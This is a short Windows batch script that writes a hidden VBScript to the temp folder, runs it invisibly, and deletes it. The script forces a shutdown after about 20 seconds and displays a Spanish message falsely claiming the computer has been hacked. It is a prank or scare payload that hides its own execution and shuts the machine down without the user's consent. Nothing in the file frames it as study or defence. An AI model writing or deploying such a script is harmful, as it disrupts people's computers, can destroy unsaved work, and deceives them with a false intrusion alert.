@echo off
echo Set objShell = WScript.CreateObject("WScript.Shell") > %temp%\Invisible.vbs
echo objShell.Run "cmd /c timeout /nobreak /t 10 >nul && shutdown -s -t 10 -c ""Esta computadora ha sido hackeada, se apagará en 10 segundos.""", 0, false >> %temp%\Invisible.vbs
wscript.exe %temp%\Invisible.vbs
del %temp%\Invisible.vbs
